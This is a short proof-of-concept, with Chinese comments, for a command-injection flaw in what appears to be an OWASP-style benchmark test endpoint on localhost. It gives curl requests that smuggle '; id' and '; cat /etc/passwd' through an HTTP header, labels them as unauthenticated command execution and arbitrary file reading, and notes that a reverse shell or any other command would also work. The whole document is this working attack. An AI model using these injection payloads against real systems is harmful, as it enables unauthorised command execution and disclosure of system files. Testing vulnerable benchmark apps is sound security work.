# 命令执行：注入分号分隔的命令（无需鉴权）
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00511' \
  -H 'BenchmarkTest00511: ; id'

# 读取任意文件
curl -X POST 'http://localhost:8443/benchmark/cmdi-00/BenchmarkTest00511' \
  -H 'BenchmarkTest00511: ; cat /etc/passwd'

# 反向 shell 或其它任意命令均可行